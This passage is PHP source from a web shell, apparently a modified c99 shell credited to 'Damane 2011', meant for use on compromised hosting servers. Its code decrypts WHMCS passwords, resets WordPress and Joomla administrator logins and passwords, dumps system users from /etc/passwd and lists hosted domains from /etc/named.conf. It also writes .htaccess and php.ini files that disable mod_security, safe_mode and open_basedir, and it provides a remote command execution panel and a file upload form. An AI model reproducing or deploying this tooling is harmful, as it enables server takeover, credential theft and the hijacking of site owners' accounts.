<font color="#0066FF" size='+2'>Symlink to configuration.php of WHMCS</font><br>
</center>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="1">
<br>
 <input type="text" size="30" name="file" value="">
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>
<hr>

<br>
<center>
<font color="#0066FF" size='+2'>DB configuration of WHMCS</font><br>
</center>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="2">
<br>
<table border=1>

<tr><td>db_host </td><td><input type="text" size="30" name="db_host" value="localhost"></td></tr>
<tr><td>db_username </td><td><input type="text" size="30" name="db_username" value=""></td></tr>
<tr><td>db_password</td><td><input type="text" size="30" name="db_password" value=""></td></tr>
<tr><td>db_name</td><td><input type="text" size="30" name="db_name" value=""><td></tr>
<tr><td>cc_encryption_hash</td><td><input type="text" size="30" name="cc_encryption_hash" value=""></td></tr>

</table>
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>
<hr>
<center>
<font color="#0066FF" size='+2'>Password decoder</font><br>
<?
 if($_POST['form_action'] == 3 )
 {



 $password=($_POST['password']);

 $cc_encryption_hash=($_POST['cc_encryption_hash']);


$password = decrypt ($password, $cc_encryption_hash);

echo("Password is ".$password);

}
?>
</center>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="3">
<br>
<table border=1>

<tr><td>Password</td><td><input type="text" size="30" name="password" value=""></td></tr>
<tr><td>cc_encryption_hash</td><td><input type="text" size="30" name="cc_encryption_hash" value=""></td></tr>

</table>
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>
<hr>


  <center> <font color="#FFFF6FF" size='+1'>   Coded By Damane 2011 abdou2010new@hotmail.fr   </font><br><br> <center>
<?
  }
if ($act == "wpchange") {

if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"wp-\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"wp-\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
      <br>
Set A New username 4 Login : <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
Set A New password 4 Login : <INPUT name=\"pwd\" size=\"15\" value=\"damane\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Success :now use a new user and pass 2 login in the admin panel</b> ";
}

}
}
 if ($act == "plugin") {

                                           for($uid=0;$uid<60000;$uid++){
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                   print "\n";
                                                }
                                        }
                                 echo "</textarea>";
                                 print "\n";
}


if ($act == "changejoo") {
if(empty($_POST['pwd'])){echo "
<FORM method=\"POST\">
Host&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\"><p>
Database : <INPUT size=\"15\" value=\"database\" name=\"database\" type=\"text\"><p>
Username : <INPUT size=\"15\" value=\"db_user\" name=\"username\" type=\"text\"><p>
Password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><p>
Set A New Username For Login : <INPUT name=\"admin\" size=\"15\" value=\"Damane\"><p>
The Password is : <font color='#FF0000'>SQL</font> <INPUT type=\"hidden\" name=\"pwd\" size=\"15\" 
value=\"23f8d1a856992bf10d677d3abd482b2e:4yeeXqIbyqPlw5IhGrZnfDjpq0pqknY7\"><p>
<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";}
else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);

$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());

if($SQL){
echo "<b><font color='#C0C0C0'>Success <br>~ Coded By 
</font><font color='#FF0000'>Damane2011</font><font color='#C0C0C0'>";}

}}
if ($act == "bypass") {
function bypass_htaccess() {
  $htaccess=fopen(getcwd().$slash."/.htaccess","w");
fwrite($htaccess,"Options +FollowSymLinks
DirectoryIndex ssssss.htm
Options All Indexes
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
SetEnv PHPRC ".getcwd().$slash."/php.ini
suPHP_ConfigPath ".getcwd().$slash."/php.ini");
fclose($htaccess);
if(is_file(getcwd().$slash."/.htaccess")) { echo "<Span style='color:green;'><strong>.htaccess Created successfully</strong></span><br>"; } else { echo "<strong><Span style='color:red;'>I can not create .htaccess</strong></span><br>"; };
}
function bypass_php() {
  $php=fopen(getcwd().$slash."/php.ini","w");
fwrite($php,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF");
fclose($php);
if(is_file(getcwd().$slash."/php.ini")) { echo "<strong><Span style='color:green;'>php.ini Created successfully</strong></span><br>"; } else { echo "<strong><Span style='color:red;'>I can not create php.ini</strong></span><br>"; };
}
function bypass_ini() {
  $ini=fopen(getcwd().$slash."/ini.php","w");
fwrite($ini,'ini_restore("safe_mode");
ini_restore("open_basedir");');
fclose($ini);
if(is_file(getcwd().$slash."/ini.php")) { echo "<strong><Span style='color:green;'>ini.php Created successfully</strong></span><br>"; } else { echo "<strong><Span style='color:red;'>I can not create ini.php</strong></span><br>" ; };
}}
if ($act == "GetDomains") {

$d0mains = @file("/etc/named.conf");

if(!$d0mains){ die("<b># can't ReaD -> [ /etc/named.conf ]"); }

echo "<table align=center border=1>
<tr bgcolor=green><td>d0mains</td><td>users</td></tr>";

foreach($d0mains as $d0main){

if(eregi("zone",$d0main)){

preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();

if(strlen(trim($domains[1][0])) > 2){ 

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>"; flush();

}}}
;
}
?>
<div  class=barheader2><b>.: COMMANDS PANEL By Damane2011 :.</b></div>
<table class=mainpanel>
<?php
if (!$safemode) {
?>
<tr><td align=right>Command:</td>
<td><form method="POST">
    <input type=hidden name=act value="cmd">
    <input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>">
    <input type=hidden name="cmd_txt" value="1"> - <input type=submit name=submit value="Execute">
    </form>
</td></tr>
<?php
}
?>
<tr><td align=right>Kernel Info:</td>
<td><form method="post" action="http://google.com/search">
    <input type="hidden" name="client" value="firefox-a">
    <input type="hidden" name="rls" value="org.mozilla:en-US:official">
    <input type="hidden" name="hl" value="en">
    <input type="hidden" name="hs" value="b7p">
    <input name="q" type="text" id="q" size="80" value="<?php echo wordwrap(php_uname()); ?>"> -
    <input type=submit name="btnG" VALUE="Search">
    </form>
</td></tr>
<tr><td align=right>Upload:</td>
<td><form method="POST" enctype="multipart/form-data">
    <input type=hidden name=act value="upload">
    <input type=hidden name="miniform" value="1">
    <input type="file" name="uploadfile"> - <input type=submit name=submit value="Upload"> <?php echo $wdt; ?>
    </form>
</td></tr>

<script language="javascript">
function set_arg(txt1,txt2) {
  document.forms.fphpfsys.arg1.value = txt1;
  document.forms.fphpfsys.arg2.value = txt2;
  }
</script>

<tr><td align=right>/etc/passwd:</td>
<td><form method="POST"><input type=hidden name=act value="plugin">
    <input type=submit name="get" VALUE="Get Users">
    </form></td></tr>
    
    <tr><td align=right>By Passing Security:</td>
<td><form method="POST"><input type=hidden name=act value="bypass">
    <input type=submit name="go" VALUE="By Pass">
    </form></td></tr>
    
<tr><td align=right>View File:</td>
<td><form method="POST"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="f" size="70" value="<?php echo $dispd; ?>"> - <input type=submit value="View">
    </form></td></tr>
</table>
<div class=barheader2 colspan=2><font color=white>Modified by DAMANE2011: <?php echo round(getmicrotime()-starttime,4); ?> seconds</font></div>
</body></html>
<?php chdir($lastdir); c99shexit(); ?> 